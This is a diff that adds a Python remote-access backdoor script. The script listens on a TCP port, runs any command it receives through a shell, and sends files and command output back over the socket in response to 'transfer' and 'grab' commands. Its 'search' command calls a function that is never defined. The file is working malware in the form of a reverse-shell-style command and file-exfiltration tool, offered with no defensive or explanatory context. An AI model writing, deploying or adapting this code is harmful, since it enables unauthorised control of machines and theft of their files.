@@ -1,0 +1,56 @@
+import socket
+import subprocess
+import os
+
+def transfer(s,path):
+    if os.path.exists(path):
+        f = open(path, 'rb')
+        packet = f.read(1024)
+        while packet:
+            s.send(packet)
+            packet = f.read(1024)
+        s.send('DONE'.encode())
+        f.close()
+        
+    else:
+        s.send('File not found'.encode())
+
+def connect():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind(('127.0.0.1', 8080))
+    s.listen(1)
+    print ('[+] Listening for incoming TCP connections on port 8080')
+    conn, addr = s.accept()
+    print ('[+] Client connected: ', addr)
+    while True:
+        command = conn.recv(1024).decode()
+        if 'terminate' in command:
+            conn.close()
+            break
+        elif 'transfer' in command:
+            _,path = command.split(' ')#transfer file.txt
+            try:
+                transfer(conn,path)
+            except:
+                conn.send('Could not transfer the file'.encode())
+                
+        elif 'grab' in command:
+            _,path = command.split(' ')
+            try:
+                transfer(conn,path)
+            except:
+                conn.send('Could not transfer the file'.encode())
+        elif 'search' in command:
+            _,path,ext = command.split(' ')
+            try:
+                search(conn,path,ext)
+            except:
+                conn.send('Could not conduct the search'.encode())
+        else:
+            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            conn.send(CMD.stdout.read())
+            conn.send(CMD.stderr.read())
+
+def main():
+    connect()
+main()
